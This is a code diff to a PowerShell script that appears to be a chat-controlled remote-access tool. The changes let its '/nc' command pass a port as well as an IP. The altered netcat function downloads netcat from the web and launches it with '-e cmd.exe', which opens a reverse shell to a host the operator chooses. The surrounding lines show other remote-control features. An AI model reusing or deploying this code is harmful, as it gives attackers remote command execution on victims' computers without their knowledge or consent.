@@ -520,7 +520,7 @@ public static void SwitchRightVirtualDesktopInWin10()
     Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
 }
 
-function netcat($ip) {
+function netcat($ip, $port) {
     Send-Message "Downloading_netcat.."
     $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
     $outpath = "C:\Users\$env:username\Documents\nc.zip"
@@ -530,7 +530,7 @@ function netcat($ip) {
     
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $args = "$ip 8888 -e cmd.exe"
+    $args = "$ip $port -e cmd.exe"
     $netcat = $outpathUnzip+"\nc.exe"
 
     Start-Sleep -Seconds 5
@@ -730,7 +730,8 @@ While ($DoNotExit)  {
       }
       "/nc $ipV4 *"{
         $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
-        netcat $ip
+	$port = ($LastMessageText -split ("/nc $ipV4 "))[2]
+        netcat $ip $port
       }
       "/stopnc $ipV4"{
         stopnetcat
